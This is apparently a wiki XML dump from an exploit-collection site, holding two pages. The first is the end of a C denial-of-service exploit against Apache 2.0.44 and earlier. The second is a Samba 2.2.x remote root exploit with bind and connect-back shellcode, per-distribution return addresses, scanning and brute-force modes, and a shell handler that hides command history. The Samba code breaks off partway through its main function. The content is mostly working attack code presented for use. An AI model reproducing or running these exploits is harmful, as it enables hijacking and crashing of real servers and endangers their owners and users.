#include &lt;sys/types.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;
#include &lt;sys/socket.h&gt;


int main(int argc, char *argv[])
{
int sockfd;
int count;
char buffer[8000000];
struct sockaddr_in target;
struct hostent *he;

if (argc != 3)
{
fprintf(stderr, "\nTH-apachedos.c - Apache &lt;= 2.0.44 DoS exploit.");
fprintf(stderr, "\n----------------------------------------------");
fprintf(stderr, "\nUsage: %s &lt;Target&gt; &lt;Port&gt;\n\n", argv[0]);
exit(-1);
}

printf("\nTH-Apache DoS\n");
printf("-------------\n");
printf("-&gt; Starting...\n"); 
printf("-&gt;\n");

// memset(buffer, '\n', sizeof(buffer)); /* testing */

for (count = 0; count &lt; 8000000;) 
{
buffer[count] = '\r'; /* 0x0D */
count++;
buffer[count] = '\n'; /* 0x0A */
count++;
}

if ((he=gethostbyname(argv[1])) == NULL)
{
herror("gethostbyname() failed ");
exit(-1);
}

memset(&amp;target, 0, sizeof(target));
target.sin_family = AF_INET;
target.sin_port = htons(atoi(argv[2]));
target.sin_addr = *((struct in_addr *)he-&gt;h_addr);

printf("-&gt; Connecting to %s:%d...\n", inet_ntoa(target.sin_addr), atoi(argv[2]));
printf("-&gt;\n");

if ((sockfd=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; 0)
{
perror("socket() failed ");
exit(-1);
}

if (connect(sockfd, (struct sockaddr *)&amp;target, sizeof(struct sockaddr)) &lt; 0)
{
perror("connect() failed ");
exit(-1);
}

printf("-&gt; Connected to %s:%d... Sending linefeeds...\n", inet_ntoa(target.sin_addr),
atoi(argv[2]));
printf("-&gt;\n");

if (send(sockfd, buffer, strlen(buffer), 0) != strlen(buffer))
{
perror("send() failed ");
exit(-1);
close(sockfd);
} 


close(sockfd);

printf("-&gt; Finished smoothly, check hosts apache...\n\n");
}

// milw0rm.com [2003-04-11]
            
&lt;/pre&gt;</text>
      <sha1>tv8y4h6fievqg2e53w8joyfydyxyj0w</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2003-0201 Samba 小於 2.2.8 (Linux/BSD) 遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>1655</id>
    <revision>
      <id>2059</id>
      <timestamp>2021-05-03T12:25:01Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; /*     Remote root exploit for Samba 2.2.x and prior that works against      Linux (all distributions), FreeBSD (4.x, 5.x), NetBSD (1.x) and      OpenBSD (2.x, 3..."</comment>
      <origin>2059</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="43974" sha1="p3v42zyylgznqsc72satlcbet068ayt" xml:space="preserve">==EXP==
&lt;pre&gt;
/*
    Remote root exploit for Samba 2.2.x and prior that works against 
    Linux (all distributions), FreeBSD (4.x, 5.x), NetBSD (1.x) and 
    OpenBSD (2.x, 3.x and 3.2 non-executable stack). 
    sambal.c is able to identify samba boxes. It will send a netbios
    name packet to port 137. If the box responds with the mac address
    00-00-00-00-00-00, it's probally running samba.
 
    [esdee@embrace esdee]$ ./sambal -d 0 -C 60 -S 192.168.0
    samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)
    --------------------------------------------------------------
    + Scan mode.
    + [192.168.0.3] Samba
    + [192.168.0.10] Windows
    + [192.168.0.20] Windows
    + [192.168.0.21] Samba
    + [192.168.0.30] Windows
    + [192.168.0.31] Samba
    + [192.168.0.33] Windows
    + [192.168.0.35] Windows
    + [192.168.0.36] Windows
    + [192.168.0.37] Windows
    ...
    + [192.168.0.133] Samba

    Great!
    You could now try a preset (-t0 for a list), but most of the 
    time bruteforce will do. The smbd spawns a new process on every 
    connect, so we can bruteforce the return address...

    [esdee@embrace esdee]$ ./sambal -b 0 -v 192.168.0.133
    samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)
    --------------------------------------------------------------
    + Verbose mode.
    + Bruteforce mode. (Linux)
    + Using ret: [0xbffffed4]
    + Using ret: [0xbffffda8]
    + Using ret: [0xbffffc7c]
    + Using ret: [0xbffffb50]
    + Using ret: [0xbffffa24]
    + Using ret: [0xbffff8f8]
    + Using ret: [0xbffff7cc]
    + Worked!
    --------------------------------------------------------------
  Linux LittleLinux.selwerd.lan 2.4.18-14 #1 Wed Sep 4 11:57:57 EDT 2002 i586
 i586 i386 GNU/Linux
    uid=0(root) gid=0(root) groups=99(nobody)

sambal.c : samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|

*/
  
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;netdb.h&gt;
#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;signal.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/select.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;

typedef struct {
        unsigned char type;
        unsigned char flags;
        unsigned short length;
} NETBIOS_HEADER;

typedef struct {
        unsigned char protocol[4];
        unsigned char command;
        unsigned short status;
        unsigned char reserved;
        unsigned char  flags;
        unsigned short flags2;
        unsigned char  pad[12];
        unsigned short tid;
        unsigned short pid;
        unsigned short uid;
        unsigned short mid;
} SMB_HEADER;

int OWNED = 0;
pid_t childs[100];
struct sockaddr_in addr1;
struct sockaddr_in addr2;

char linux_bindcode[] =
        "\x31\xc0\x31\xdb\x31\xc9\x51\xb1\x06\x51\xb1\x01\x51\xb1\x02\x51"
        "\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc1\x31\xc0\x31\xdb\x50\x50"
        "\x50\x66\x68\xb0\xef\xb3\x02\x66\x53\x89\xe2\xb3\x10\x53\xb3\x02"
        "\x52\x51\x89\xca\x89\xe1\xb0\x66\xcd\x80\x31\xdb\x39\xc3\x74\x05"
        "\x31\xc0\x40\xcd\x80\x31\xc0\x50\x52\x89\xe1\xb3\x04\xb0\x66\xcd"
        "\x80\x89\xd7\x31\xc0\x31\xdb\x31\xc9\xb3\x11\xb1\x01\xb0\x30\xcd"
        "\x80\x31\xc0\x31\xdb\x50\x50\x57\x89\xe1\xb3\x05\xb0\x66\xcd\x80"
        "\x89\xc6\x31\xc0\x31\xdb\xb0\x02\xcd\x80\x39\xc3\x75\x40\x31\xc0"
        "\x89\xfb\xb0\x06\xcd\x80\x31\xc0\x31\xc9\x89\xf3\xb0\x3f\xcd\x80"
        "\x31\xc0\x41\xb0\x3f\xcd\x80\x31\xc0\x41\xb0\x3f\xcd\x80\x31\xc0"
        "\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8b\x54\x24"
        "\x08\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x31\xc0"
        "\x89\xf3\xb0\x06\xcd\x80\xeb\x99";

char bsd_bindcode[] =
        "\x31\xc0\x31\xdb\x53\xb3\x06\x53\xb3\x01\x53\xb3\x02\x53\x54\xb0"
        "\x61\xcd\x80\x89\xc7\x31\xc0\x50\x50\x50\x66\x68\xb0\xef\xb7\x02"
        "\x66\x53\x89\xe1\x31\xdb\xb3\x10\x53\x51\x57\x50\xb0\x68\xcd\x80"
        "\x31\xdb\x39\xc3\x74\x06\x31\xc0\xb0\x01\xcd\x80\x31\xc0\x50\x57"
        "\x50\xb0\x6a\xcd\x80\x31\xc0\x31\xdb\x50\x89\xe1\xb3\x01\x53\x89"
        "\xe2\x50\x51\x52\xb3\x14\x53\x50\xb0\x2e\xcd\x80\x31\xc0\x50\x50"
        "\x57\x50\xb0\x1e\xcd\x80\x89\xc6\x31\xc0\x31\xdb\xb0\x02\xcd\x80"
        "\x39\xc3\x75\x44\x31\xc0\x57\x50\xb0\x06\xcd\x80\x31\xc0\x50\x56"
        "\x50\xb0\x5a\xcd\x80\x31\xc0\x31\xdb\x43\x53\x56\x50\xb0\x5a\xcd"
        "\x80\x31\xc0\x43\x53\x56\x50\xb0\x5a\xcd\x80\x31\xc0\x50\x68\x2f"
        "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b"
        "\xcd\x80\x31\xc0\xb0\x01\xcd\x80\x31\xc0\x56\x50\xb0\x06\xcd\x80"
        "\xeb\x9a";

char linux_connect_back[] =
        "\x31\xc0\x31\xdb\x31\xc9\x51\xb1\x06\x51\xb1\x01\x51\xb1\x02\x51"
        "\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc2\x31\xc0\x31\xc9\x51\x51"
        "\x68\x41\x42\x43\x44\x66\x68\xb0\xef\xb1\x02\x66\x51\x89\xe7\xb3"
        "\x10\x53\x57\x52\x89\xe1\xb3\x03\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
        "\x74\x06\x31\xc0\xb0\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
        "\xb1\x02\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f"
        "\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
        "\x01\xcd\x80"; 

char bsd_connect_back[] =
        "\x31\xc0\x31\xdb\x53\xb3\x06\x53\xb3\x01\x53\xb3\x02\x53\x54\xb0"
        "\x61\xcd\x80\x31\xd2\x52\x52\x68\x41\x41\x41\x41\x66\x68\xb0\xef"
        "\xb7\x02\x66\x53\x89\xe1\xb2\x10\x52\x51\x50\x52\x89\xc2\x31\xc0"
        "\xb0\x62\xcd\x80\x31\xdb\x39\xc3\x74\x06\x31\xc0\xb0\x01\xcd\x80"
        "\x31\xc0\x50\x52\x50\xb0\x5a\xcd\x80\x31\xc0\x31\xdb\x43\x53\x52"
        "\x50\xb0\x5a\xcd\x80\x31\xc0\x43\x53\x52\x50\xb0\x5a\xcd\x80\x31"
        "\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54"
        "\x53\x50\xb0\x3b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";



struct {
        char *type;
        unsigned long ret;
        char *shellcode;
        int os_type;    /* 0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD non-exec stack */

} targets[] = {
        { "samba-2.2.x - Debian 3.0           ", 0xbffffea2, linux_bindcode, 0 },
        { "samba-2.2.x - Gentoo 1.4.x         ", 0xbfffe890, linux_bindcode, 0 },
        { "samba-2.2.x - Mandrake 8.x         ", 0xbffff6a0, linux_bindcode, 0 },
        { "samba-2.2.x - Mandrake 9.0         ", 0xbfffe638, linux_bindcode, 0 },
        { "samba-2.2.x - Redhat 9.0           ", 0xbffff7cc, linux_bindcode, 0 },
        { "samba-2.2.x - Redhat 8.0           ", 0xbffff2f0, linux_bindcode, 0 },
        { "samba-2.2.x - Redhat 7.x           ", 0xbffff310, linux_bindcode, 0 },
        { "samba-2.2.x - Redhat 6.x           ", 0xbffff2f0, linux_bindcode, 0 },
        { "samba-2.2.x - Slackware 9.0        ", 0xbffff574, linux_bindcode, 0 },
        { "samba-2.2.x - Slackware 8.x        ", 0xbffff574, linux_bindcode, 0 },
        { "samba-2.2.x - SuSE 7.x             ", 0xbffffbe6, linux_bindcode, 0 }, 
        { "samba-2.2.x - SuSE 8.x             ", 0xbffff8f8, linux_bindcode, 0 },
        { "samba-2.2.x - FreeBSD 5.0          ", 0xbfbff374, bsd_bindcode, 1 },
        { "samba-2.2.x - FreeBSD 4.x          ", 0xbfbff374, bsd_bindcode, 1 },
        { "samba-2.2.x - NetBSD 1.6           ", 0xbfbfd5d0, bsd_bindcode, 1 },
        { "samba-2.2.x - NetBSD 1.5           ", 0xbfbfd520, bsd_bindcode, 1 },
        { "samba-2.2.x - OpenBSD 3.2          ", 0x00159198, bsd_bindcode, 2 },
        { "samba-2.2.8 - OpenBSD 3.2 (package)", 0x001dd258, bsd_bindcode, 2 },
        { "samba-2.2.7 - OpenBSD 3.2 (package)", 0x001d9230, bsd_bindcode, 2 },
        { "samba-2.2.5 - OpenBSD 3.2 (package)", 0x001d6170, bsd_bindcode, 2 },
        { "Crash (All platforms)              ", 0xbade5dee, linux_bindcode, 0 },
};

void shell();
void usage();
void handler();

int is_samba(char *ip, unsigned long time_out);
int Connect(int fd, char *ip, unsigned int port, unsigned int time_out);
int read_timer(int fd, unsigned int time_out);
int write_timer(int fd, unsigned int time_out);
int start_session(int sock);
int exploit_normal(int sock, unsigned long ret, char *shellcode);
int exploit_openbsd32(int sock, unsigned long ret, char *shellcode);

void usage(char *prog)
{
        fprintf(stderr, "Usage: %s [-bBcCdfprsStv] [host]\n\n"
                        "-b &lt;platform&gt;   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)\n"
                        "-B &lt;step&gt;       bruteforce steps (default = 300)\n"
                        "-c &lt;ip address&gt; connectback ip address\n"
                        "-C &lt;max childs&gt; max childs for scan/bruteforce mode (default = 40)\n"
                        "-d &lt;delay&gt;      bruteforce/scanmode delay in micro seconds (default = 100000)\n"
                        "-f              force\n" 
                        "-p &lt;port&gt;       port to attack (default = 139)\n"
                        "-r &lt;ret&gt;        return address\n"
                        "-s              scan mode (random)\n"
                        "-S &lt;network&gt;    scan mode\n"
                        "-t &lt;type&gt;       presets (0 for a list)\n" 
                        "-v              verbose mode\n\n", prog);
        
        exit(1);
}

int is_samba(char *ip, unsigned long time_out)
{
        char
        nbtname[]= /* netbios name packet */
        {
                0x80,0xf0,0x00,0x10,0x00,0x01,0x00,0x00,
                0x00,0x00,0x00,0x00,0x20,0x43,0x4b,0x41,
                0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
                0x41,0x41,0x41,0x41,0x41,0x00,0x00,0x21,
                0x00,0x01
        };

        unsigned char recv_buf[1024];
        unsigned char *ptr;

        int i = 0;
        int s = 0;

        unsigned int total = 0;

        if ((s = socket(PF_INET, SOCK_DGRAM, 17)) &lt;= 0) return -1;

        if(Connect(s, ip, 137, time_out) == -1) {
                close(s);
                return -1;
        } 

        memset(recv_buf, 0x00, sizeof(recv_buf));

        if(write_timer(s, time_out) == 1) {
                if (write(s, nbtname, sizeof(nbtname)) &lt;= 0) {
                        close(s);
                        return -1;
                }
        }

        if (read_timer(s, time_out) == 1) {
                if (read(s, recv_buf, sizeof(recv_buf)) &lt;= 0) {
                        close(s);
                        return -1;
                }

                ptr = recv_buf + 57;
                total = *(ptr - 1); /* max names */

                while(ptr &lt; recv_buf + sizeof(recv_buf)) {
                        ptr += 18;
                        if (i == total) {

                                ptr -= 19;                      

                                if ( *(ptr + 1) == 0x00 &amp;&amp; *(ptr + 2) == 0x00 &amp;&amp; *(ptr + 3) == 0x00 &amp;&amp;
                                     *(ptr + 4) == 0x00 &amp;&amp; *(ptr + 5) == 0x00 &amp;&amp; *(ptr + 6) == 0x00) {
                                        close(s);
                                        return 0;
                                }

                                close(s);
                                return 1;
                        }

                        i++;    
                }

        }
        close(s);
        return -1;
}

int Connect(int fd, char *ip, unsigned int port, unsigned int time_out) 
{
        /* ripped from no1 */

        int                      flags;
        int                      select_status;
        fd_set                   connect_read, connect_write;
        struct timeval           timeout;
        int                      getsockopt_length = 0;
        int                      getsockopt_error = 0;
        struct sockaddr_in       server;
        bzero(&amp;server, sizeof(server));
        server.sin_family = AF_INET;
        inet_pton(AF_INET, ip, &amp;server.sin_addr);
        server.sin_port = htons(port);

        if((flags = fcntl(fd, F_GETFL, 0)) &lt; 0) {
                close(fd);
                return -1;
        }
  
        if(fcntl(fd, F_SETFL, flags | O_NONBLOCK) &lt; 0) {
                close(fd);
                return -1;
        }
        
        timeout.tv_sec = time_out;
        timeout.tv_usec = 0;
        FD_ZERO(&amp;connect_read);
        FD_ZERO(&amp;connect_write);
        FD_SET(fd, &amp;connect_read);
        FD_SET(fd, &amp;connect_write);

        if((connect(fd, (struct sockaddr *) &amp;server, sizeof(server))) &lt; 0) {
                if(errno != EINPROGRESS) {
                        close(fd);
                        return -1;
                }
        }
        else {
                if(fcntl(fd, F_SETFL, flags) &lt; 0) {
                        close(fd);
                        return -1;
                }
                
                return 1;

        }

        select_status = select(fd + 1, &amp;connect_read, &amp;connect_write, NULL, &amp;timeout);

        if(select_status == 0) {
                close(fd);
                return -1;

        }

        if(select_status == -1) {
                close(fd);
                return -1;
        }

        if(FD_ISSET(fd, &amp;connect_read) || FD_ISSET(fd, &amp;connect_write)) {
                if(FD_ISSET(fd, &amp;connect_read) &amp;&amp; FD_ISSET(fd, &amp;connect_write))
 {
                        getsockopt_length = sizeof(getsockopt_error);

                        if(getsockopt(fd, SOL_SOCKET, SO_ERROR, &amp;getsockopt_error, &amp;getsockopt_length) &lt; 0) {
                                errno = ETIMEDOUT;
                                close(fd);
                                return -1;
                        }

                        if(getsockopt_error == 0) {
                                if(fcntl(fd, F_SETFL, flags) &lt; 0) {
                                        close(fd);
                                        return -1;
                                }
                                return 1;
                        } 

                        else {
                                errno = getsockopt_error;
                                close(fd);
                                return (-1);
                                }

                        }
                }
        else {
                close(fd);
                return 1;
        }

        if(fcntl(fd, F_SETFL, flags) &lt; 0) {
                close(fd);
                return -1;
        }
        return 1;
}

int read_timer(int fd, unsigned int time_out)
{

        /* ripped from no1 */

        int                      flags;
        int                      select_status;
        fd_set                   fdread;
        struct timeval           timeout;

        if((flags = fcntl(fd, F_GETFL, 0)) &lt; 0) {
                close(fd);
                return (-1);
        }

        if(fcntl(fd, F_SETFL, flags | O_NONBLOCK) &lt; 0) {
                close(fd);
                return (-1);
        }

        timeout.tv_sec = time_out;
        timeout.tv_usec = 0;
        FD_ZERO(&amp;fdread);
        FD_SET(fd, &amp;fdread);
        select_status = select(fd + 1, &amp;fdread, NULL, NULL, &amp;timeout);

        if(select_status == 0) {
                close(fd);
                return (-1);
        }

        if(select_status == -1) {
                close(fd);
                return (-1);
        }
  
        if(FD_ISSET(fd, &amp;fdread)) {
  
                if(fcntl(fd, F_SETFL, flags) &lt; 0) {
                        close(fd);
                        return -1;
                }
                
                return 1;

        } 
        else {
                close(fd);
                return 1;

        }
}

int write_timer(int fd, unsigned int time_out)
{

        /* ripped from no1 */

        int                      flags;
        int                      select_status;
        fd_set                   fdwrite;
        struct timeval           timeout;

        if((flags = fcntl(fd, F_GETFL, 0)) &lt; 0) {    
                close(fd);
                return (-1);
        }

        if(fcntl(fd, F_SETFL, flags | O_NONBLOCK) &lt; 0) {
                close(fd);
                return (-1);
        }
        
        timeout.tv_sec = time_out;
        timeout.tv_usec = 0;
        FD_ZERO(&amp;fdwrite);
        FD_SET(fd, &amp;fdwrite);

        select_status = select(fd + 1, NULL, &amp;fdwrite, NULL, &amp;timeout);

        if(select_status == 0) {
                close(fd);
                return -1;
        }

        if(select_status == -1) {
                close(fd);
                return -1;
        }

        if(FD_ISSET(fd, &amp;fdwrite)) {
                if(fcntl(fd, F_SETFL, flags) &lt; 0) {
                        close(fd);
                        return -1;
                }
                return 1;
        }
        else { 
                close(fd);
                return -1;
        }
}


void shell(int sock)
{
        fd_set  fd_read;
        char buff[1024], *cmd="unset HISTFILE; echo \"*** JE MOET JE MUIL HOUWE\";uname -a;id;\n";
        int n;

        FD_ZERO(&amp;fd_read);
        FD_SET(sock, &amp;fd_read);
        FD_SET(0, &amp;fd_read);

        send(sock, cmd, strlen(cmd), 0);

        while(1) {
                FD_SET(sock,&amp;fd_read);
                FD_SET(0,&amp;fd_read);

                if (select(FD_SETSIZE, &amp;fd_read, NULL, NULL, NULL) &lt; 0 ) break;

                if (FD_ISSET(sock, &amp;fd_read)) {

                        if((n = recv(sock, buff, sizeof(buff), 0)) &lt; 0){
                                fprintf(stderr, "EOF\n");
                                exit(2);
                        }

                        if (write(1, buff, n) &lt; 0) break;
                }

                if (FD_ISSET(0, &amp;fd_read)) {

                        if((n = read(0, buff, sizeof(buff))) &lt; 0){
                                fprintf(stderr, "EOF\n");
                                exit(2);
                        }

                        if (send(sock, buff, n, 0) &lt; 0) break;
                }

                usleep(10);
        }

        fprintf(stderr, "Connection lost.\n\n");
        exit(0);
}

void handler()
{
        int sock = 0;
        int i = 0;
        OWNED = 1;

        for (i = 0; i &lt; 100; i++)
                if (childs[i] != 0xffffffff) waitpid(childs[i], NULL, 0);

        if ((sock = socket(AF_INET, SOCK_STREAM, 6)) &lt; 0) {
                close(sock);
                exit(1);
        }

        if(Connect(sock, (char *)inet_ntoa(addr1.sin_addr), 45295, 2) != -1) {
                fprintf(stdout, "+ Worked!\n"
                                "--------------------------------------------------------------\n");
                shell(sock);
                close(sock);
        }


}

int start_session(int sock)
{
        char buffer[1000];
        char response[4096];
        char session_data1[]    = "\x00\xff\x00\x00\x00\x00\x20\x02\x00\x01\x00\x00\x00\x00";
        char session_data2[]    = "\x00\x00\x00\x00\x5c\x5c\x69\x70\x63\x24\x25\x6e\x6f\x62\x6f\x64\x79"
                                  "\x00\x00\x00\x00\x00\x00\x00\x49\x50\x43\x24";

        NETBIOS_HEADER  *netbiosheader;
        SMB_HEADER      *smbheader;

        memset(buffer, 0x00, sizeof(buffer));

        netbiosheader   = (NETBIOS_HEADER *)buffer;
        smbheader       = (SMB_HEADER *)(buffer + sizeof(NETBIOS_HEADER));

        netbiosheader-&gt;type     = 0x00;         /* session message */
        netbiosheader-&gt;flags    = 0x00;
        netbiosheader-&gt;length   = htons(0x2E);

        smbheader-&gt;protocol[0]  = 0xFF;
        smbheader-&gt;protocol[1]  = 'S';
        smbheader-&gt;protocol[2]  = 'M';
        smbheader-&gt;protocol[3]  = 'B';
        smbheader-&gt;command      = 0x73;         /* session setup */
        smbheader-&gt;flags        = 0x08;         /* caseless pathnames */
        smbheader-&gt;flags2       = 0x01;         /* long filenames supported */
        smbheader-&gt;pid          = getpid() &amp; 0xFFFF;
        smbheader-&gt;uid          = 100;
        smbheader-&gt;mid          = 0x01;

        memcpy(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER), session_data1, sizeof(session_data1) - 1);

        if(write_timer(sock, 3) == 1)
                if (send(sock, buffer, 50, 0) &lt; 0) return -1;

        memset(response, 0x00, sizeof(response));

        if (read_timer(sock, 3) == 1)
                if (read(sock, response, sizeof(response) - 1) &lt; 0) return -1;

        netbiosheader = (NETBIOS_HEADER *)response;
        smbheader     = (SMB_HEADER *)(response + sizeof(NETBIOS_HEADER));

        if (netbiosheader-&gt;type != 0x00) fprintf(stderr, "+ Recieved a non session message\n");

        netbiosheader   = (NETBIOS_HEADER *)buffer;
        smbheader       = (SMB_HEADER *)(buffer + sizeof(NETBIOS_HEADER));

        memset(buffer, 0x00, sizeof(buffer));

        netbiosheader-&gt;type     = 0x00;         /* session message */
        netbiosheader-&gt;flags    = 0x00;
        netbiosheader-&gt;length   = htons(0x3C);

        smbheader-&gt;protocol[0]  = 0xFF;
        smbheader-&gt;protocol[1]  = 'S';
        smbheader-&gt;protocol[2]  = 'M';
        smbheader-&gt;protocol[3]  = 'B';
        smbheader-&gt;command      = 0x70;         /* start connection */
        smbheader-&gt;pid          = getpid() &amp; 0xFFFF;
        smbheader-&gt;tid          = 0x00;
        smbheader-&gt;uid          = 100;

        memcpy(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER), session_data2, sizeof(session_data2) - 1);

        if(write_timer(sock, 3) == 1)
                if (send(sock, buffer, 64, 0) &lt; 0) return -1;

        memset(response, 0x00, sizeof(response));

        if (read_timer(sock, 3) == 1)
                if (read(sock, response, sizeof(response) - 1) &lt; 0) return -1;

        netbiosheader = (NETBIOS_HEADER *)response;
        smbheader     = (SMB_HEADER *)(response + sizeof(NETBIOS_HEADER));

        if (netbiosheader-&gt;type != 0x00) return -1;

        return 0;
}

int exploit_normal(int sock, unsigned long ret, char *shellcode)
{

        char buffer[4000];
        char exploit_data[] =
                "\x00\xd0\x07\x0c\x00\xd0\x07\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\xd0\x07\x43\x00\x0c\x00\x14\x08\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00" 
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x90";

        int i = 0;
        unsigned long dummy = ret - 0x90;

        NETBIOS_HEADER  *netbiosheader;
        SMB_HEADER      *smbheader;

        memset(buffer, 0x00, sizeof(buffer));

        netbiosheader   = (NETBIOS_HEADER *)buffer;
        smbheader       = (SMB_HEADER *)(buffer + sizeof(NETBIOS_HEADER));

        netbiosheader-&gt;type             = 0x00;         /* session message */
        netbiosheader-&gt;flags            = 0x04;
        netbiosheader-&gt;length           = htons(2096);

        smbheader-&gt;protocol[0]          = 0xFF;
        smbheader-&gt;protocol[1]          = 'S';
        smbheader-&gt;protocol[2]          = 'M';
        smbheader-&gt;protocol[3]          = 'B';
        smbheader-&gt;command              = 0x32;         /* SMBtrans2 */
        smbheader-&gt;tid                  = 0x01;
        smbheader-&gt;uid                  = 100;

        memset(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER) + sizeof(exploit_data), 0x90, 3000);

        buffer[1096] = 0xEB;
        buffer[1097] = 0x70;

        for (i = 0; i &lt; 4 * 24; i += 8) {
                memcpy(buffer + 1099 + i, &amp;dummy, 4);
                memcpy(buffer + 1103 + i, &amp;ret,   4);
        }

        memcpy(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER), 
                        exploit_data, sizeof(exploit_data) - 1);
        memcpy(buffer + 1800, shellcode, strlen(shellcode));

        if(write_timer(sock, 3) == 1) {
                if (send(sock, buffer, sizeof(buffer) - 1, 0) &lt; 0) return -1;
                return 0;
        }

        return -1;
}

int exploit_openbsd32(int sock, unsigned long ret, char *shellcode)
{
        char buffer[4000];

        char exploit_data[] =
                "\x00\xd0\x07\x0c\x00\xd0\x07\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\xd0\x07\x43\x00\x0c\x00\x14\x08\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                "\x00\x00\x00\x90";

        int i = 0;
        unsigned long dummy = ret - 0x30;
        NETBIOS_HEADER  *netbiosheader;
        SMB_HEADER      *smbheader;

        memset(buffer, 0x00, sizeof(buffer));

        netbiosheader   = (NETBIOS_HEADER *)buffer;
        smbheader       = (SMB_HEADER *)(buffer + sizeof(NETBIOS_HEADER));

        netbiosheader-&gt;type             = 0x00;         /* session message */
        netbiosheader-&gt;flags            = 0x04;
        netbiosheader-&gt;length           = htons(2096);

        smbheader-&gt;protocol[0]          = 0xFF;
        smbheader-&gt;protocol[1]          = 'S';
        smbheader-&gt;protocol[2]          = 'M';
        smbheader-&gt;protocol[3]          = 'B';
        smbheader-&gt;command              = 0x32;         /* SMBtrans2 */
        smbheader-&gt;tid                  = 0x01;
        smbheader-&gt;uid                  = 100;

        memset(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER) + sizeof(exploit_data), 0x90, 3000);

        for (i = 0; i &lt; 4 * 24; i += 4)
                memcpy(buffer + 1131 + i, &amp;dummy, 4);

        memcpy(buffer + 1127, &amp;ret,      4);

        memcpy(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER),
                        exploit_data, sizeof(exploit_data) - 1);

        memcpy(buffer + 1100 - strlen(shellcode), shellcode, strlen(shellcode));

        if(write_timer(sock, 3) == 1) {
                if (send(sock, buffer, sizeof(buffer) - 1, 0) &lt; 0) return -1;
                return 0;
        }

        return -1;
}


int main (int argc,char *argv[])
{
        char *shellcode = NULL;
        char scan_ip[256];

        int brute       = -1;
        int connectback = 0;
        int force       = 0;
        int i           = 0;
        int ip1         = 0;
        int ip2         = 0;
        int ip3         = 0;
        int ip4         = 0;
        int opt         = 0;
        int port        = 139;
        int random      = 0;
        int scan        = 0;
        int sock        = 0;
        int sock2       = 0;
        int status      = 0;
        int type        = 0;
        int verbose     = 0;

        unsigned long BRUTE_DELAY       = 100000;
        unsigned long ret               = 0x0;
        unsigned long MAX_CHILDS        = 40;
        unsigned long STEPS             = 300;

        struct hostent          *he;

        fprintf(stdout, "samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)\n"
                        "--------------------------------------------------------------\n");
        
        while((opt = getopt(argc,argv,"b:B:c:C:d:fp:r:sS:t:v")) !=EOF) {
                switch(opt) 
                {
                        case 'b':
                                brute = atoi(optarg);
                                if ((brute &lt; 0) || (brute &gt; 3)) {
                                        fprintf(stderr, "Invalid platform.\n\n");
                                        return -1;
                                }
                                break;
                        case 'B':
                                STEPS = atoi(optarg);
                                if (STEPS == 0) STEPS++;
                                break;
                        case 'c':
                                sscanf(optarg, "%d.%d.%d.%d", &amp;ip1, &amp;ip2, &amp;ip3, &amp;ip4);
                                connectback = 1;

                                if (ip1 == 0 || ip2 == 0 || ip3 == 0 || ip4 == 0) {
                                        fprintf(stderr, "Invalid IP address.\n\n");
                                        return -1;
                                }

                                linux_connect_back[33] = ip1; bsd_connect_back[24] = ip1;
                                linux_connect_back[34] = ip2; bsd_connect_back[25] = ip2;
                                linux_connect_back[35] = ip3; bsd_connect_back[26] = ip3;
                                linux_connect_back[36] = ip4; bsd_connect_back[27] = ip4;

